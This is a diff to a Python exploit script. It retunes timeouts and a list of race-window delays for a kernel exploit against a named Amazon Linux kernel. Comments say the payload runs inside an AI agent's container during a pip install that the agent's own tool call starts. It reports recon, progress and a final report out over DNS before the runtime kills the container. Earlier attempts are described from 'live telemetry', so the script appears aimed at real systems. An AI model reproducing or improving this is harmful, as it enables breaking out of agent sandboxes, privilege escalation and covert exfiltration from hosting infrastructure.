@@ -65,18 +65,25 @@ WANT_KERNEL = os.environ.get("GLK_KERNEL", "6.1.161-18.298.amzn2023")
 WANT_UID = int(os.environ.get("GLK_UID", "10001"))
 ALLOW_ROOT = os.environ.get("GLK_ALLOW_ROOT", "0") == "1"
 
-# Total exploit budget (seconds) across all delay runs.
-TMO = float(os.environ.get("GLK_TMO", "720"))
+# Total exploit budget (seconds) across all delay runs.  The AgentCore
+# runtime kills the container ~15 min after the last agent/user event and
+# our tool call cannot be kept alive mid-install, so the payload must
+# complete its ENTIRE DNS transcript (recon -> rotation -> verdict ->
+# runs-done -> final report -> end marker) well inside that window:
+# caps at 420 s of exploit phase + ~1.5 min recon + ~1 min report tail
+# leaves ~2.5 min for pip's wheel phase and the agent's reply.
+TMO = float(os.environ.get("GLK_TMO", "420"))
 # Per-run budget (seconds) for one exploit execution.
-RUN_TMO = float(os.environ.get("GLK_RUN_TMO", "240"))
-# Delay rotation list, microseconds. 460 first (the value validated in the
-# QEMU lab), then a sweep incl. sub-15 us entries: live telemetry showed the
-# sprayed-fd signal beating the consumer into select even at 10 us, so 0 us
-# (select entered synchronously right after the green light) is now tried.
+RUN_TMO = float(os.environ.get("GLK_RUN_TMO", "120"))
+# Delay rotation, microseconds, ordered live-first: live telemetry proved
+# 460/50/30/20/15/10 all miss with instant-return selects; the per-install
+# budget now covers ~7-9 runs, so spend them on the still-untested window
+# (1-10 us) before re-proving values.  0 us sits late (a TCG boot wedged
+# the select with 0 first -- keep it late, it is cheap).
 DELAYS = [int(x) for x in
            os.environ.get("GLK_DELAYS",
-                          "460,50,30,20,15,10,5,3,2,1,0,100,75,40,25,12,8,6,"
-                          "4,450,455,465,470,7,150,200")
+                          "10,5,3,1,2,0,15,20,25,30,40,50,75,460,100,455,465,"
+                          "470,12,8,6,4,450,150,200")
            .split(",") if x.strip()]
 
 # Consumer pselect burst size (profile max_calls/burst_calls).  Lab result:
